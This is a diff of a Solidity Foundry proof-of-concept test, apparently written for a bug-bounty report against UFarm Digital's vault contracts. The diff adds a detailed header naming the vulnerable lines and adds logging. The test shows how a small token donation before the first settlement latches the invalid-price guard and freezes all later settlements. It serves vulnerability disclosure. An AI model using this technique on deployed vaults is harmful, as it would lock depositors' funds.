@@ -1,18 +1,34 @@
 // SPDX-License-Identifier: BUSL-1.1
-/// @notice Worker C PoC — FINDING F-01 (donation before first settlement latches the
-/// invalid-price guard and freezes all settlements).
-///
-/// Standalone harness: production contracts copied byte-identical from
-/// scope/ @ b19a6511c61157bfd68df1c28f0299e68bde02fb into ../src (+ 4 mock
-/// contracts also copied byte-identical). The MockUFarmOracle stands in for the
-/// Quex oracle: submitNav delivers the NAV the off-chain backend would report.
-/// Key modelling assumption (stated in the finding): the backend NAV counts all
-/// tokens held by the vault, so a direct ERC20 donation to the vault address
-/// inflates the reported NAV. Pending deposits are NOT in the NAV: they sit in
-/// escrow until settlement releases them to the vault.
+/**
+ * @title UFarm Digital - Donation before first settlement latches the price and freezes settlements
+ * @notice PoC for Remedy submission (F-03)
+ * @dev Demonstrates the invalid-price latch: a donation before the first
+ *      settlement hardcodes a $1 reference price, so the next settlement
+ *      trips the price guard and freezes all settlements.
+ *
+ * Vulnerable contract: VaultLifecycleModule (UFarmVault)
+ * Vulnerable function: _settleRequests / _validatePrice
+ * Vulnerable lines: VaultLifecycleModule.sol:351-354 (hardcoded WAD),
+ *   :364 (price check skipped while pricingSupply == 0),
+ *   :386 (isInvalidPrice latch)
+ * Program: https://hunt.r.xyz/programs/ufarm-digital
+ * Report: https://hunt.r.xyz/report-thread/27dd88c1-90bd-4b8b-87c7-7f70ae5b5b78
+ * Severity: Medium
+ * Target: UFarmDigital/UFarm-EVM-Contracts @ b19a6511 ("Production Release 2.1.1")
+ *
+ * Standalone harness: production contracts copied byte-identical from the
+ * scope repo @ b19a6511 into ../src (+ 4 mock contracts, PoC-only). The
+ * MockUFarmOracle stands in for the Quex oracle: submitNav delivers the NAV
+ * the off-chain backend would report. Key modelling assumption (stated in the
+ * finding): the backend NAV counts all tokens held by the vault, so a direct
+ * ERC20 donation to the vault address inflates the reported NAV. Pending
+ * deposits are NOT in the NAV: they sit in escrow until settlement releases
+ * them to the vault.
+ */
 pragma solidity 0.8.35;
 
 import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
 
@@ -131,12 +147,17 @@ contract DonationPriceLatchTest is Test {
         // 1. Attacker donates 11 units straight to the vault BEFORE any deposit.
         vm.prank(attacker);
         asset.transfer(address(vault), 11);
+        console.log("vault asset balance after donation (before any deposit)", asset.balanceOf(address(vault)));
 
         // 2. First depositor requests 100; settlement ignores NAV (supply == 0)
         //    and hardcodes lastTokenPrice = $1 even though true price is $1.11.
         vm.prank(owner);
         vault.requestDeposit(100, owner, owner);
         _settleWithNav(vault, 11); // NAV = vault holdings = donation only (deposit still in escrow)
+        console.log("lastTokenPrice after first settlement (hardcoded reference)", vault.lastTokenPrice());
+        console.log("true price after first settlement (NAV 111 / supply 100)", (111 * WAD) / 100);
+        console.log("totalSupply after first settlement", vault.totalSupply());
+        console.log("vault asset balance after first settlement", asset.balanceOf(address(vault)));
         assertEq(vault.totalSupply(), 100, "first settlement mints 1 share per $1");
         assertEq(asset.balanceOf(address(vault)), 111, "vault holds deposit + donation");
         assertEq(vault.lastTokenPrice(), WAD, "BUG: reference price hardcoded to $1, true price is $1.11");
@@ -148,6 +169,8 @@ contract DonationPriceLatchTest is Test {
         vm.prank(owner);
         vault.requestDeposit(10, owner, owner);
         _settleWithNav(vault, 111);
+        console.log("isInvalidPrice after second settlement", vault.isInvalidPrice());
+        console.log("pending deposit preserved after failed settlement", vault.pendingDepositRequest(0, owner));
         assertTrue(vault.isInvalidPrice(), "invalid-price latch must be set");
         assertEq(vault.activeOracleRequestId(), 0, "oracle request consumed, settlement skipped");
         assertEq(vault.pendingDepositRequest(0, owner), 10, "pending deposit preserved, not settled");
@@ -193,6 +216,8 @@ contract DonationPriceLatchTest is Test {
         vm.prank(owner);
         vault.requestDeposit(10, owner, owner);
         _settleWithNav(vault, 100); // NAV = vault holdings only; pending 10 still in escrow
+        console.log("lastTokenPrice (control, no donation)", vault.lastTokenPrice());
+        console.log("isInvalidPrice (control, no donation)", vault.isInvalidPrice());
         assertFalse(vault.isInvalidPrice(), "no latch without a donation");
         assertEq(vault.claimableDepositRequest(0, owner), 10, "second deposit settles normally");
         assertEq(vault.lastTokenPrice(), WAD, "price stays $1");
